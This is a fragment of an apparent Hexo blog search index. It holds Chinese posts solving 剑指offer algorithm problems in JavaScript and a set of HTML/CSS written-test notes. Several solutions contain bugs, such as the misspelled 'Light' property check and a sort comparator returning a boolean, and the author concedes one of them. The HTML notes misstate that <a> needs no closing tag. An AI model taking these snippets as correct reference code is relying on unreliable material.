搜索树与双向链表","text":"剑指offer面试题36：二叉搜索树与双向链表 题目：输入一棵二叉搜索树，将该二叉搜索树转换成为排序的双向链表，要求不能创建任何新的节点，只能调整二叉树当中指针的指向 思路：这道题也是使用的递归的思想，和大多数二叉树的题一样，我们把上面这棵树分成三个部分，根节点10、左子树、右子树。那么以根节点出发，根据二叉搜索树的性质我们可以很简单地推断出，10的左节点就是左子树的最大值，10的右节点就是右子树的最小值。那么递归的规律我们就找到了，先找出左子树的最大值节点，和根节点10进行连接；再找出右子树的最大值节点，和根节点10连接。 接下来找到递归终点：当一个节点是叶子节点，那么直接返回这个节点即可 需要注意的是：10的左边连接的是左子树最大值，右边连接的是右子树的最大值。所以我们的函数不仅需要操作指针，还需要返回当前树的最值节点。（最左边或者最右边） 代码如下： 123456789101112131415161718192021222324252627282930313233function ConvertNode(a, num)&#123; if(a === null) return null if(a.left === null &amp;&amp; a.right === null)&#123; return a &#125; else&#123; if(a.left)&#123; let flag = ConvertNode(a.left, 0) a.left = flag flag.right = a &#125; if(a.right)&#123; let flag1 = ConvertNode(a.right, 1) a.right = flag1 flag1.left = a &#125; if(num === 0)&#123; return (a.right === null ? a : a.right)//这个地方其实写的有问题，需要返回当前根节点的最右节点，而不是右节点 &#125; else if(num === 1)&#123; return (a.left === null ? a : a.left)//这个地方也一样 //但是这个代码却在牛客上面过了....... &#125; &#125; &#125; function Convert(a)&#123; if(a === null) return null let p = ConvertNode(a,1) while(p &amp;&amp; p.left)&#123; p = p.left &#125; return p &#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题38-字符串的排列","slug":"剑指offer面试题38-字符串的排列","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.271Z","comments":true,"path":"2020/03/15/剑指offer面试题38-字符串的排列/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9838-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%8E%92%E5%88%97/","excerpt":"剑指offer面试题38：字符串的排列","text":"剑指offer面试题38：字符串的排列 题目描述输入一个字符串,按字典序打印出该字符串中字符的所有排列。例如输入字符串abc,则打印出由字符a,b,c所能排列出来的所有字符串abc,acb,bac,bca,cab和cba。 思路：这道题使用的是动态规划和递归的思想。对于输入的一个字符串，可以把它分为两个部分：首字母和剩下的部分。然后对剩下的部分进行递归处理，在递归的过程中，使用一个栈记录递归的路径，对于传入的非空字符串，先将首字母入栈，然后递归剩下的部分， 然后该字母出栈。当到达递归终点：传入的字符串是个空串，那么就将当前栈内保存的路径加入到结果集数组里面。 注意：这个方法需要注意遇到诸如’aa’这样的串，只有一种排列。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839function Permutation(str)&#123; // write code here if(str.length === 0) return [] let arr = [] let res = [] let stack = [] let obj = &#123;&#125; solve(str, arr, stack) for(let i = 0; i &lt; arr.length; i++)&#123; res.push(arr[i].toString().replace(/,/g, '')) &#125; for(let i = 0; i &lt; res.length; i++)&#123; obj.hasOwnProperty(res[i]) obj[res[i]] = 1 &#125; res = [] for(let i in obj)&#123; res.push(i) &#125; return res&#125;function solve(str, arr, stack)&#123; if(str.length &gt; 0)&#123; for(let i = 0; i &lt; str.length; i++)&#123; //分别将所有字符都设置为首字符 stack.push(str[i]) let flag = str.slice(0, i) + str.slice(i + 1, str.length) + '' //剩下的串进行递归 solve(flag, arr, stack) //递归完成，当前首字符出栈 stack.pop() &#125; &#125; else&#123; arr.push(JSON.parse(JSON.stringify(stack))) &#125; &#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题37-序列化二叉树","slug":"剑指offer面试题37-序列化二叉树","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.270Z","comments":true,"path":"2020/03/15/剑指offer面试题37-序列化二叉树/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9837-%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%8C%E5%8F%89%E6%A0%91/","excerpt":"剑指offer面试题37：序列化二叉树","text":"剑指offer面试题37：序列化二叉树 请实现两个函数，分别用来序列化和反序列化二叉树 二叉树的序列化是指：把一棵二叉树按照某种遍历方式的结果以某种格式保存为字符串，从而使得内存中建立起来的二叉树可以持久保存。序列化可以基于先序、中序、后序、层序的二叉树遍历方式来进行修改，序列化的结果是一个字符串，序列化时通过 某种符号表示空节点（#），以 ！ 表示一个结点值的结束（value!）。 二叉树的反序列化是指：根据某种遍历顺序得到的序列化字符串结果str，重构二叉树。 在序列化的过程当中，我们使用的是递归的前序遍历，从根节点开始，当遇到的节点不为空，那么就往数组中添加这个节点的值，否则往数组中添加一个特殊字符&#39;#&#39; 关于反序列化，既然我们用递归进行的序列化，那么依然可以使用递归进行反序列化。除此之外，也可以不使用递归，借助栈和循环的方式也可以实现反序列化 首先说一说递归，这道题的递归思路是：对于传入的一个串，也是分为根节点，左子树，右子树；那么就可以首先将第一个字符构建成为一个根节点，然后分别对左右子树进行递归构建（先构建左子树，再构建右子树,保证两者的顺序是关键）。递归终点就是，当传入的串第一个字符是#号，说明当前已经构建到了叶子节点，那么返回null，继续构建其他子树 代码如下（递归版本） 123456789101112131415161718192021222324252627282930313233function TreeNode(x) &#123; this.val = x; this.left = null; this.right = null;&#125;var arr = [];function Serialize(pRoot)&#123; // write code here if(pRoot==null)&#123; arr.push('a'); &#125;else&#123; arr.push(pRoot.val); Serialize(pRoot.left); Serialize(pRoot.right); &#125; &#125;function Deserialize(s)&#123; // write code here var node = null; if(arr.length&lt;1)&#123; return null; &#125; var number = arr.shift(); if(typeof number == 'number')&#123; node = new TreeNode(number); node.left = Deserialize(arr); node.right = Deserialize(arr); &#125; return node;&#125; 然后就是非递归，我们需要用一个栈记录当前需要处理的节点，所以我们给每个节点增加了Left和Right，用来鉴别当前这个节点是不是已经给左子树和右子树都赋值（不管赋的是节点还是null），如果两者都已赋值则标为：已处理，否则记为未处理。那么对于当前的循环，首先判断栈顶节点是否已经被处理，如果被处理，则弹出栈，否则先后查看该节点的左子树和右子树，给没有被处理的子树添加节点，如果添加的节点不为null，那么就将这个新节点继续入栈，如此往复 代码如下（非递归版本） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657function TreeNode(x)&#123; this.val = x this.left = null this.right = null this.Left = 0 this.Right = 0&#125;let po = []function Serialize(pRoot)&#123; // write code here if(pRoot === null)&#123; po.push('#') return null &#125; else&#123; po.push(pRoot.val) Serialize(pRoot.left) Serialize(pRoot.right) &#125;&#125;function Deserialize(s)&#123; // write code here let stack = [] let root = (po[0] === '#') ? null : new TreeNode(po[0]) if(root !== null)&#123; stack.push(root) &#125; po.shift() while(po.length &gt; 0 &amp;&amp; stack.length &gt; 0)&#123; if(stack[stack.length - 1].Left === 0)&#123; let k = (po[0] === '#') ? null : new TreeNode(po[0]) stack[stack.length - 1].left = k stack[stack.length - 1].Left = 1 if(k !== null)&#123; stack.push(k) &#125; po.shift() &#125; else if(stack[stack.length - 1].Right === 0)&#123; let k = (po[0] === '#') ? null : new TreeNode(po[0]) stack[stack.length - 1].right = k stack[stack.length - 1].Right = 1 if(k !== null)&#123; stack.push(k) &#125; po.shift() &#125; else if(stack[stack.length - 1].Left !== 0 &amp;&amp; stack[stack.length - 1].Light !== 0)&#123; stack.pop() &#125; &#125; return root&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题4-二维数组中的查找","slug":"剑指offer面试题4-二维数组中的查找","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.271Z","comments":true,"path":"2020/03/15/剑指offer面试题4-二维数组中的查找/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%984-%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE/","excerpt":"剑指offer面试题4：二维数组中的查找","text":"剑指offer面试题4：二维数组中的查找 在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。代码如下： 12345678910111213141516171819function Find(target, array)&#123; // write code here var len = array[0].length - 1 var he = 0 var flag = 0 while(len &gt;= 0 &amp;&amp; he &lt;= array.length - 1)&#123; if(array[he][len] &gt; target)&#123; len -- &#125; else if(array[he][len] &lt; target)&#123; he ++ &#125; else&#123; return true &#125; &#125; return false&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题39-数组中出现次数超过一半的数字","slug":"剑指offer面试题39-数组中出现次数超过一半的数字","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.271Z","comments":true,"path":"2020/03/15/剑指offer面试题39-数组中出现次数超过一半的数字/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9839-%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E8%B6%85%E8%BF%87%E4%B8%80%E5%8D%8A%E7%9A%84%E6%95%B0%E5%AD%97/","excerpt":"剑指offer面试题39：数组中出现次数超过一半的数字","text":"剑指offer面试题39：数组中出现次数超过一半的数字 数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。例如输入一个长度为9的数组{1,2,3,2,2,2,5,4,2}。由于数字2在数组中出现了5次，超过数组长度的一半，因此输出2。如果不存在则输出0。 代码如下： 12345678910111213function MoreThanHalfNum_Solution(numbers)&#123; // write code here let arr = [] for(let i = 0; i &lt; numbers.length; i++)&#123; arr[numbers[i]] === undefined ? arr[numbers[i]] = 1 : arr[numbers[i]] += 1 &#125; for(let i = 0; i &lt; arr.length; i++)&#123; if((arr[i] || 0) &gt; ((numbers.length)/2))&#123; return i &#125; &#125; return 0&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题45-把数组组成最小的数","slug":"剑指offer面试题45-把数组组成最小的数","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.272Z","comments":true,"path":"2020/03/15/剑指offer面试题45-把数组组成最小的数/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9845-%E6%8A%8A%E6%95%B0%E7%BB%84%E7%BB%84%E6%88%90%E6%9C%80%E5%B0%8F%E7%9A%84%E6%95%B0/","excerpt":"剑指offer面试题45：把数组组成最小的数","text":"剑指offer面试题45：把数组组成最小的数 输入一个正整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。例如输入数组{3，32，321}，则打印出这三个数字能排成的最小数字为321323。 这道题直观的解法就是，对于给定的两个串a和b，要想知道他们两个怎么排最小，直接比较ab和ba就可以了。这道题主要的考点其实是在于大数的处理，题目输入的数字不一定是大数，但是几个数字拼接起来就免不了成为大数，所以需要用字符串来解决问题。 代码如下： 12345678function PrintMinNumber(numbers) &#123; const sortNumber = numbers.sort((a, b) =&gt; &#123; const str1 = a + '' + b; const str2 = b + '' + a; return Number(str1) &gt; Number(str2); &#125;); return sortNumber.join('');&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题40-最小的k个数","slug":"剑指offer面试题40-最小的k个数","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.272Z","comments":true,"path":"2020/03/15/剑指offer面试题40-最小的k个数/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9840-%E6%9C%80%E5%B0%8F%E7%9A%84k%E4%B8%AA%E6%95%B0/","excerpt":"剑指offer面试题40：最小的k个数","text":"剑指offer面试题40：最小的k个数 输入n个整数，找出其中最小的K个数。例如输入4,5,1,6,2,7,3,8这8个数字，则最小的4个数字是1,2,3,4,。 和上一题做法一样，使用哈希表，控制时间复杂度到O(n)，然后从小到大遍历哈希表知道遍历的次数到达k，那么所得遍历结果就是最小的k个数 代码如下： 123456789101112131415161718function GetLeastNumbers_Solution(input, k)&#123; // write code here let arr = [] let res =[] for(let i = 0; i &lt; input.length; i++)&#123; arr[input[i]] = 1 &#125; let i = 0 while(k &gt; 0)&#123; if(arr[i] !== undefined) &#123; res.push(i) k-- &#125; i++ &#125; return res&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题55-二叉树的深度","slug":"剑指offer面试题55-二叉树的深度","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T04:21:29.360Z","comments":true,"path":"2020/03/15/剑指offer面试题55-二叉树的深度/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9855-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6/","excerpt":"剑指offer面试题55：二叉树的深度","text":"剑指offer面试题55：二叉树的深度 题目：输入某个二叉树，求该树很节点到叶子节点最远路径的长度，该长度定义为二叉树的深度，例如下面这个二叉树，输出值为4这个题目也是使用递归的思想，以上面这个树为例：要求以1为根节点的树的深度，其实就是分别求出其左子树和右子树的深度，取两者的最大值，加上a本身占用的深度值就可以了递归终点的设置，自然就是当传入的节点是一个空指针，这个时候返回0就可以了 代码如下： 1234 function treedeep(a)&#123; if(a === null) return 0 return Math.max(treedeep(a.left), treedeep(a.right)) + 1&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题7-重建二叉树","slug":"剑指offer面试题7-重建二叉树","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T04:21:29.360Z","comments":true,"path":"2020/03/15/剑指offer面试题7-重建二叉树/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%987-%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91/","excerpt":"剑指offer面试题7：重建二叉树","text":"剑指offer面试题7：重建二叉树 题目：输入某个二叉树的前序和中序遍历结果，重建该二叉树，例如输入前序遍历：12473568，中序遍历：47215386，则重建二叉树如下这道题目使用递归的话思路就非常简单，函数接收两个长度一样的遍历结果，根据前序遍历第一个节点在中序遍历当中的位置，就可以判断出左子树和右子树分别有哪些节点，然后再分别把左子树和右子树当做另一个新的二叉树进行相同的方法递归，当传入的前序遍历和中序遍历都只有一个节点时说明到达递归终点，此时返回根节点即可 代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041function TreeNode(x) &#123; this.val = x; this.left = null; this.right = null; &#125; function reConstructBinaryTree(pre, vin)&#123; let root //定义根节点 if(pre.length === 1)&#123; root = &#123; val : pre, left : null, right : null &#125; &#125; else&#123; let index = vin.indexOf(pre[0]) if(index === 0)&#123; root = &#123; val : pre[0], left : null, right : reConstructBinaryTree(pre.slice(index + 1) ,vin.slice(index + 1)) &#125; &#125; else if(index === vin.length - 1)&#123; root = &#123; val : pre[0], left : reConstructBinaryTree(pre.slice(1, index + 1) ,vin.slice(0, index)), right : null &#125; &#125; else&#123; root = &#123; val : pre[0], left : reConstructBinaryTree(pre.slice(1, index + 1) ,vin.slice(0, index)), right : reConstructBinaryTree(pre.slice(index + 1) ,vin.slice(index + 1)) &#125; &#125; &#125; return root &#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题8-二叉树的下一个节点","slug":"剑指offer面试题8-二叉树的下一个节点","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.274Z","comments":true,"path":"2020/03/15/剑指offer面试题8-二叉树的下一个节点/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%988-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E8%8A%82%E7%82%B9/","excerpt":"剑指offer面试题8：二叉树的下一个节点","text":"剑指offer面试题8：二叉树的下一个节点 题目：给定一颗二叉树和其中一个节点，如何找出中序遍历序列的下一个节点。注意，树中的结点不仅包含左右子结点，同时包含指向父结点的指针。 思路： 如果一个结点有右子树，那么它的下一个结点就是它的右子树中的左子结点。也就是说右子结点出发一直沿着指向左子结点的指针，我们就能找到它的下一个结点。 接着我们分析一个结点没有右子树的情形。如果结点是它父节点的左子结点，那么它的下一个结点就是它的父结点。 如果一个结点既没有右子树，并且它还是它父结点的右子结点，这种情形就比较复杂。我们可以沿着指向父节点的指针一直向上遍历，直到找到一个是它父结点的左子结点的结点。如果这样的结点存在，那么这个结点的父结点就是我们要找的下一个结点。 代码如下 12345678910111213141516171819function GetNext(a)&#123; if(a === null) return null let target = null if(a.right)&#123; target = a.right while(target.left)&#123; target = target.left &#125; &#125; else if(a.parent)&#123; let cur = a target = a.parent while(target &amp;&amp; target.left != cur )&#123; cur = target target = target.parent &#125; &#125; return target&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题6-从头到尾打印链表","slug":"剑指offer面试题6-从头到尾打印链表","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.273Z","comments":true,"path":"2020/03/15/剑指offer面试题6-从头到尾打印链表/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%986-%E4%BB%8E%E5%A4%B4%E5%88%B0%E5%B0%BE%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8/","excerpt":"剑指offer面试题6：从尾到头打印链表","text":"剑指offer面试题6：从尾到头打印链表 输入个链表的头结点，从尾到头反过来打印出每个结点的值。 思路：由题意得，这道题需要实现的是一个“先进后出”的效果，那么实现这种效果当然需要使用栈的思想。而这道题，除了使用栈这种数据结构本身，也可以使用类似于栈的其他解决办法 先来看第一种，直接使用栈代码如下： 123456789101112function printListFromTailToHead(head)&#123; // write code here let current = head let arr = [] while(current)&#123; arr.unshift(current.val); current = current.next &#125; return arr&#125; 如果不使用栈，还可以使用类栈的编程方法。我们知道，递归在本质上就是一个栈的结构。所以我们访问到一个节点时，先递归后面的节点，再输出节点本身，就实现了一个栈的效果 代码如下： 12345678910111213function Print(head, arr)&#123; if(head === null) return [] if(head.next !== null)&#123; Print(head.next, arr) &#125; arr.push(head.val)&#125;function printListFromTailToHead(head)&#123; let current = head let arr = [] Print(current, arr) return arr&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题9-用两个栈实现队列","slug":"剑指offer面试题9-用两个栈实现队列","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.274Z","comments":true,"path":"2020/03/15/剑指offer面试题9-用两个栈实现队列/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%989-%E7%94%A8%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/","excerpt":"剑指offer面试题9：用两个栈实现队列","text":"剑指offer面试题9：用两个栈实现队列 题目：用两个栈实现一个队列。队列的声明如下，请实现它的两个函数push 和pop，分别完成在队列尾部插入结点和在队列头部删除结点的功能。 思路：我们知道，栈只能实现先进后出，但是队列是先进先出，对于栈来说，每次弹出的是栈顶元素，但是队列弹出的却是栈底的元素，所以我们需要用一个容器先暂存栈底元素上面的元素，然后再弹出，那么另外这个容器当然也是一个栈。 代码如下： 1234567891011121314let Pop = []let Push = []function push(node)&#123; while(Pop.length !== 0)&#123; Push.push(Pop.pop()) &#125; Push.push(node)&#125;function pop()&#123; while(Push.length !== 0)&#123; Pop.push(Push.pop()) &#125; return Pop.pop()&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"笔试错题集——HTML和CSS篇","slug":"笔试错题集——HTML和CSS篇","date":"2020-03-13T16:00:00.000Z","updated":"2024-05-25T04:21:29.275Z","comments":true,"path":"2020/03/14/笔试错题集——HTML和CSS篇/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/14/%E7%AC%94%E8%AF%95%E9%94%99%E9%A2%98%E9%9B%86%E2%80%94%E2%80%94HTML%E5%92%8CCSS%E7%AF%87/","excerpt":"第一题","text":"第一题 id选择器是css1的 第二题1.div:first-child要满足的条件，首先必须得是div元素，还得是第一个子元素，如果不满足 就不会被选中 2.div:first-of-type要满足的条件，首先必须得是div元素，还得是第一个出现的div元素，如果不满足 就不会被选中 3.nth-childa:nth-child(5)： 必须是a元素 必须是第五个子元素 4.nth-of-type：a:nth-of-type:选中所有a元素中的第n个a元素 第三题 ele.clientWidth = 宽度 + padding ele.offsetWidth = 宽度 + padding + border ele.scrollTop = 被卷去的上侧距离 ele.scrollHeight = 自身实际的高度（不包括边框） 第四题&lt;track&gt; 标签为诸如 video 元素之类的媒介规定外部文本轨道。用于规定字幕文件或其他包含文本的文件，当媒介播放时，这些文件是可见的。 第五题注意#会跳转到页面顶部，所以这题不选a 第六题其中 font 标签，存在反语义（ font 解释为文字，但 ”文字“ 意思太泛了，而是应根据使用环境选择其他标签。如标题 &lt;h1&gt; ~ &lt;h6&gt; &lt;p&gt;等标签）在 HTML 4.01 中，不被赞成使用； 第七题不是所有标签都需要结束标签，例如-&lt;a&gt;；doctype类型会影响；HTML标签对大小写不敏感，为了规范，推荐小写。 第八题multiple用于select的多选或者上传多个文件 categories: [前端,面经笔经]thumbnail: /images/fe/1.pngtoc: true第一题 id选择器是css1的 第二题 